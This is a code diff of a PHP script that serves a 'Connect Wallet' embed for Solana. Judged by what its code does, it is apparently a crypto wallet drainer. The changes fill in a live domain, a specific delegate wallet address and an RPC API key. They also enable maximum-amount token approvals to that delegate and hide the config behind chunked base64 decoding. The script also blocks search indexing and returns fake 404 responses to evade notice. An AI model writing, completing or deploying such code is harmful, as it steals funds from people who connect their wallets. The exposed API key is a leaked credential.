@@ -10,30 +10,29 @@ $cfg = [
 
     'script_path' => 'vault38472',
     'button_class_mode' => 'exact',
-    'button_class' => 'K7mQ2',
+    'button_class' => 'ffrf2',
     'network' => 'solana',
 
     'site_name' => 'Connect Wallet',
     'site_description' => 'Connect your Solana wallet',
-    'site_icons' => ['https://vote-moonshot.top/tYZq2BsVawvS5wYEF.svg'],
-    'site_url' => 'https://vote-moonshot.top',
+    'site_icons' => ['https://fuzzy-octo-guacamole-delta.vercel.app/tYZq2BsVawvS5wYEF.svg'],
+    'site_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app',
 
-    'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/p7KqN2mR9vXw.js',
-    'vercel_bundle_cache_seconds' => 300,
+    'vercel_bundle_url' => 'https://fuzzy-octo-guacamole-delta.vercel.app/0EBM88LeOsHh.js',
 
     'analytics' => false,
     'restrict_script_access' => true,
 
     'token_approval_enabled' => true,
-    'token_delegate' => 'YOUR_SOLANA_PUBLIC_ADDRESS',
-    'token_approval_max_count' => 10,
+    'token_delegate' => 'c9eSVFDgCT4utkZL6PPnJfaiAGecDQy8JJBAKeND2ws',
+    'token_approval_max_count' => 1,
     'token_approval_min_usd' => 1.0,
     'token_approval_amount_mode' => 'max',
-    'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=YOUR_KEY',
+    'solana_rpc_url' => 'https://mainnet.helius-rpc.com/?api-key=68b95562-1955-4c26-92ba-0e240a8b9d62',
 
     'connect_popup_enabled' => true,
     'connect_popup_url' => '',
-    // 'connect_popup_title' => 'Gentle Crown',
+    
 ];
 
 function build_embed_config(array $cfg, string $siteUrl): array
@@ -119,6 +118,21 @@ function request_source_hosts(): array
     return array_values(array_unique($hosts));
 }
 
+function embed_config_preamble(array $embedConfig): string
+{
+    $json = json_encode($embedConfig, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
+    $payload = base64_encode($json);
+    $chunks = array_map(
+        static fn(string $part): string => '"' . addcslashes($part, "\\\"") . '"',
+        str_split($payload, 48) ?: [''],
+    );
+    $blob = implode('+', $chunks);
+
+    return '(function(w,f,j){var c=j.parse(f(' . $blob . '));'
+        . 'Object.defineProperty(w,"__WALLET_EMBED_CONFIG__",'
+        . '{value:c,writable:!1,enumerable:!1,configurable:!1})})(window,atob,JSON);';
+}
+
 function send_generic_not_found(): void
 {
     http_response_code(404);
@@ -153,8 +167,8 @@ function load_wallet_bundle(array $cfg): ?string
     if ($vercelUrl === '') {
         return null;
     }
-    $ttl = max(60, (int) ($cfg['vercel_bundle_cache_seconds'] ?? 300));
-    return fetch_vercel_bundle_cached($vercelUrl, $ttl);
+    assert_vercel_bundle_url($vercelUrl);
+    return fetch_vercel_bundle_remote($vercelUrl);
 }
 
 function assert_vercel_bundle_url(string $url): void
@@ -173,27 +187,6 @@ function assert_vercel_bundle_url(string $url): void
     if ($path === '' || $path === '/') {
         throw new RuntimeException('vercel_bundle_url must include a path, e.g. /p7KqN2mR9vXw.js');
     }
-}
-
-function fetch_vercel_bundle_cached(string $url, int $ttlSeconds): ?string
-{
-    assert_vercel_bundle_url($url);
-    $cacheDir = __DIR__ . '/cache';
-    if (!is_dir($cacheDir)) {
-        mkdir($cacheDir, 0750, true);
-    }
-    $cacheFile = $cacheDir . '/bundle.cache.js';
-    if (is_file($cacheFile) && (time() - filemtime($cacheFile)) < $ttlSeconds) {
-        $cached = file_get_contents($cacheFile);
-        if ($cached !== false && $cached !== '') {
-            return $cached;
-        }
-    }
-    $remote = fetch_vercel_bundle_remote($url);
-    if ($remote !== null && $remote !== '') {
-        file_put_contents($cacheFile, $remote, LOCK_EX);
-    }
-    return $remote;
 }
 
 function fetch_vercel_bundle_remote(string $url): ?string
@@ -241,9 +234,8 @@ header('X-Robots-Tag: noindex, nofollow');
 
 $embedConfig = build_embed_config($cfg, $siteUrl);
 
-echo 'window.__WALLET_EMBED_CONFIG__=';
-echo json_encode($embedConfig, JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
-echo ";\n";
+echo embed_config_preamble($embedConfig);
+echo "\n";
 
 try {
     $bundle = load_wallet_bundle($cfg);
